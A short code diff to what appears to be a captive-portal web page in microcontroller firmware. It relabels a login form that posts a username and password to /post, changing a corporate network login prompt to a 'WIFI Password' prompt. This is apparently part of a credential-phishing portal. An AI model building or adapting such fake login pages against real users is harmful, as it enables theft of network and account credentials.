@@ -84,8 +84,8 @@ String header(String t)
 
 String index()
 {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Login de rede: EMPRESA\\Usuário </label>" +
-         "<input type=text name=u></input><label>Senha:</label>" +
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Login Name </label>" +
+         "<input type=text name=u></input><label>WIFI Password</label>" +
          "<input type=password name=m></input><input type=submit value=Conectar></form>" + footer();
 }
 
